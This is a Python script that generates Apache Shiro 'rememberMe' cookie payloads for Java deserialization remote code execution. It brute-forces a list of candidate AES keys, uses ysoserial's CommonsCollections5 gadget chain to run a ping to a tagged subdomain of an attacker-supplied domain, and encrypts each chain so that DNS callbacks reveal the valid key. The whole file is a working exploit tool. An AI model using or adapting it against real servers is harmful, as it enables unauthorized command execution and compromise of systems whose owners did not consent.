import sys
import base64
import uuid
import random
import string
import subprocess
import json
from Crypto.Cipher import AES

def encode_rememberme(command, key):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-SNAPSHOT.jar', 'CommonsCollections5', 'ping'+' '+command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  key
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':

    keys= []
    flags = []
    payloads = []
    key_flag = {}

    with open('keys_bak.txt', "r", encoding='utf8') as f:
        for line in f:
            keys.append(line.strip())  ## 注意strip()掉换行符
    #print(keys)

    for key in keys:
        flag = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
        flags.append(flag)
        key_flag[key] = flag

    with open('./key_flag.json', "w", encoding='utf-8') as json_file:
        json.dump(key_flag, json_file, ensure_ascii=False, indent=6)

    for i in range(len(keys)):
        payload = encode_rememberme(flags[i]+'.'+sys.argv[1], keys[i])
        payloads.append(payload.decode())
    with open('./payload.txt', 'w', encoding='utf-8') as f:
        for i in payloads:
            f.write(i+'\n')
